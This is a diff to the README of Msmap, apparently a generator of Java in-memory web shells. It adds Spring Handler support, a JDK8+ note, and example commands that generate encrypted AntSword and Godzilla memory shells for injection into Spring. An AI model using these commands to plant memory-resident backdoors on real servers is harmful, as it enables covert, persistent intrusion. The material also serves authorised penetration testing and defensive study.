@@ -34,13 +34,15 @@ Msmap是一个内存马生成器，兼容多种容器、组件、编码器、*We
   - [ ] GlassFish
   - [ ] WebLogic
   - [ ] JBoss
-  - [x] Spring
+  - [x] Spring*
   - [ ] Netty
   - [x] JVM*
 - .NET
   - [ ] IIS
 - PHP
 - Python
+
+*：SpringHandler仅支持JDK8+
 
 *：默认支持`Linux Tomcat 8/9`，可以根据进阶指南适配更多版本
 
@@ -153,6 +155,10 @@ private static String pattern = "*.xml";
 
 `python generator.py Java Tomcat WsFilter AES128 JSPJS passwd`
 
+**JSPJS**类型 搭配 **[xor_md5](extend/AntSword/encoder/xor_md5.js)** 编码器 | 注入到 Spring Handler
+
+`python generator.py Java Spring Handler XOR JSPJS passwd`
+
 </details>
 
 <details>
@@ -178,6 +184,10 @@ private static String pattern = "*.xml";
 **JAVA_AES_BASE64**类型 | AgentFiless注入到 HttpServlet
 
 `python generator.py Java JDK JavaX AES128 Godzilla superidol`
+
+**JAVA_AES_BASE64**类型 | 注入到 Spring Handler
+
+`python generator.py Java Spring Handler AES128 Godzilla superidol`
 
 > [已知问题](https://github.com/BeichenDream/Godzilla/issues/76)
 
